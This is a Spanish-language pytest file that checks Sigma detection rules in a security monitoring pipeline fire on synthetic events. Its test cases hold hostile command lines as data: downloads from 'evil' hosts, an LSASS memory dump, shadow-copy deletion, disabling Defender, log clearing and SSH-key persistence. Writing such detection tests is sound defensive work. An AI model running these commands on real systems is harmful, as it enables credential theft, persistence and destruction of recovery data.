"""
Pruebas de la Fase 4-A: ampliación de cobertura Sigma.

Dos hallazgos de la auditoría motivan este archivo:

1. Las 15 reglas Sigma (pySigma) que ya existían en config/sigma_rules/selected/
   nunca las cargaba el `Pipeline` real: solo las usaba un script de evaluación
   offline (`scripts/evaluate_sigma_phase1.py`). No detectaban nada en
   producción. Este archivo prueba que ahora sí, a través de `Pipeline` y de
   `IngestService` (la API), no solo del cargador aislado.
2. Se añadieron 23 reglas nuevas. Cada una se prueba contra un evento
   sintético real que representa la técnica que dice cubrir, no solo se
   comprueba que el YAML parsea.
"""
from __future__ import annotations

import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from cybersentinel.api.app import IngestService  # noqa: E402
from cybersentinel.config import DEFAULT_RULES_DIR, DEFAULT_SIGMA_RULES_DIR  # noqa: E402
from cybersentinel.detection.rules_engine import RulesEngine  # noqa: E402
from cybersentinel.pipeline import Pipeline  # noqa: E402
from cybersentinel.schema import SecurityEvent  # noqa: E402

SIGMA_DIR = DEFAULT_SIGMA_RULES_DIR
RULES_DIR = DEFAULT_RULES_DIR
NOW = datetime.now(tz=timezone.utc)


def _event(**kw) -> SecurityEvent:
    base = dict(event_id="x", timestamp=NOW, source="sysmon",
                category="process", action="process_create")
    base.update(kw)
    return SecurityEvent(**base)


# --------------------------- conexión al pipeline ---------------------------
def test_sigma_rules_dir_existe_y_tiene_38_reglas():
    """Guarda de regresión: si alguien borra un archivo, esto lo nota."""
    engine = RulesEngine.from_sigma_directory(SIGMA_DIR)
    assert len(engine.rules) == 38, (
        f"se esperaban 38 reglas pySigma, se cargaron {len(engine.rules)}. "
        "¿Se movió o rompió algún archivo en config/sigma_rules/selected/?"
    )


def test_pipeline_sin_sigma_rules_dir_usa_solo_las_propias():
    """Comportamiento por defecto sin cambios: quien no pide Sigma, no lo obtiene."""
    p = Pipeline(rules_dir=RULES_DIR, enable_rag=False, enable_llm=False)
    assert len(p.rules_engine.rules) == 7
    assert "propias" in p.component_status["sigma"]


def test_pipeline_con_sigma_rules_dir_combina_ambos_motores():
    """
    Esta es la prueba que faltaba: `Pipeline` real cargando las 38 reglas
    Sigma además de las 7 propias, no un cargador aislado en un script.
    """
    p = Pipeline(rules_dir=RULES_DIR, sigma_rules_dir=SIGMA_DIR,
                enable_rag=False, enable_llm=False)
    assert len(p.rules_engine.rules) == 45
    assert "45 reglas" in p.component_status["sigma"]
    assert "38 pySigma" in p.component_status["sigma"]


def test_pipeline_sigma_rules_dir_inexistente_no_rompe_nada(caplog):
    """Un directorio Sigma mal configurado se ignora con log, no tumba el arranque."""
    p = Pipeline(rules_dir=RULES_DIR, sigma_rules_dir="/no/existe/de/verdad",
                enable_rag=False, enable_llm=False)
    assert len(p.rules_engine.rules) == 7


def test_api_ingest_service_carga_sigma_por_defecto(tmp_path):
    """
    La API real (`IngestService`, la que expone POST /api/v1/events) debe
    traer las reglas Sigma activadas por defecto: es el punto de producción
    que el Bloque A quería reforzar.
    """
    svc = IngestService(
        db_path=tmp_path / "events.db", wal_dir=tmp_path / "wal",
        audit_path=None, enable_rag=False, enable_llm=False,
    )
    assert len(svc.pipeline.rules_engine.rules) == 45


def test_cli_analyze_usa_sigma_rules_dir():
    """Guarda de regresión sobre cli.py: no basta con que exista la constante."""
    import inspect
    from cybersentinel import cli
    fuente = inspect.getsource(cli)
    assert "sigma_rules_dir=DEFAULT_SIGMA_RULES" in fuente


# --------------------- cada regla nueva contra un evento real ---------------
NEW_RULE_CASES = [
    ("T1197", _event(command_line="bitsadmin /transfer job /download http://evil/x.exe",
                     process_name="bitsadmin.exe")),
    ("T1218.001", _event(process_name="hh.exe", command_line="hh.exe payload.chm")),
    ("T1218.007", _event(command_line="msiexec /i http://evil.com/pkg.msi")),
    ("T1218.009", _event(process_name="regasm.exe", command_line="regasm.exe /u evil.dll")),
    ("T1003.001", _event(command_line="procdump.exe -ma lsass.exe out.dmp")),
    ("T1057", _event(process_name="tasklist.exe", command_line="tasklist.exe")),
    ("T1082", _event(process_name="systeminfo.exe", command_line="systeminfo.exe")),
    ("T1016", _event(command_line="ipconfig /all")),
    ("T1049", _event(process_name="netstat.exe", command_line="netstat.exe -an")),
    ("T1482", _event(command_line="nltest /domain_trusts")),
    ("T1490", _event(command_line="vssadmin delete shadows /all /quiet")),
    ("T1489", _event(command_line="net stop windefend")),
    ("T1562.001", _event(command_line="Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("T1547.001", _event(command_line="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x")),
    ("T1136.001", _event(command_line="net user hacker Passw0rd! /add")),
    ("T1070.001", _event(command_line="wevtutil cl Security")),
    ("T1569.002", _event(process_name="psexec.exe", command_line="psexec.exe \\\\host cmd")),
    ("T1090", _event(category="network", dst_port=9050)),
    ("T1053.003", _event(source="linux", command_line="crontab -e")),
    ("T1070.002", _event(source="linux", command_line="journalctl --vacuum-time=1s")),
    ("T1098.004", _event(source="linux", command_line="echo ssh-rsa AAA >> ~/.ssh/authorized_keys")),
    ("T1548.003", _event(source="linux", command_line="visudo -f /etc/sudoers")),
    ("T1071.004", _event(category="dns", action="dns_query",
                          raw={"QueryName": "a" * 40 + ".evil.com"})),
]


@pytest.fixture(scope="module")
def sigma_engine():
    return RulesEngine.from_sigma_directory(SIGMA_DIR)


@pytest.mark.parametrize("technique,event", NEW_RULE_CASES, ids=[c[0] for c in NEW_RULE_CASES])
def test_regla_nueva_dispara_sobre_evento_real(sigma_engine, technique, event):
    hits = [r for r in sigma_engine.rules if r.matches(event)]
    tecnicas = {h.mitre_technique for h in hits}
    assert technique in tecnicas, (
        f"ninguna regla para {technique} disparó sobre el evento sintético; "
        f"reglas que sí dispararon: {tecnicas or 'ninguna'}"
    )


def test_evento_benigno_no_dispara_las_reglas_nuevas(sigma_engine):
    """Control negativo: tráfico normal no debe generar ruido con las 23 reglas nuevas."""
    benigno = _event(command_line="chrome.exe --profile-directory=Default",
                     process_name="chrome.exe")
    hits = [r for r in sigma_engine.rules if r.matches(benigno)]
    assert hits == [], f"un evento benigno disparó: {[h.mitre_technique for h in hits]}"


def test_regla_dns_tunneling_no_dispara_con_subdominio_corto(sigma_engine):
    """Control negativo específico: DNS tunneling no debe marcar un DNS normal."""
    normal = _event(category="dns", action="dns_query",
                    raw={"QueryName": "www.google.com"})
    hits = [r for r in sigma_engine.rules if r.matches(normal)
            and r.mitre_technique == "T1071.004"]
    assert hits == []


# ------------------------------- cobertura ----------------------------------
def test_cobertura_att_ck_mejoro_frente_a_solo_reglas_propias():
    from cybersentinel.correlation import navigator

    solo_propias = RulesEngine.from_directory(RULES_DIR).rules
    combinadas = solo_propias + RulesEngine.from_sigma_directory(SIGMA_DIR).rules

    antes = navigator.layer_from_rules(solo_propias)
    despues = navigator.layer_from_rules(combinadas)

    assert len(antes["techniques"]) == 7
    assert len(despues["techniques"]) == 41
    assert len(despues["techniques"]) > len(antes["techniques"])

    tacticas_antes = {r.mitre_tactic for r in solo_propias}
    tacticas_despues = {r.mitre_tactic for r in combinadas}
    assert "impact" not in tacticas_antes
    assert "impact" in tacticas_despues
    assert "privilege-escalation" not in tacticas_antes
    assert "privilege-escalation" in tacticas_despues
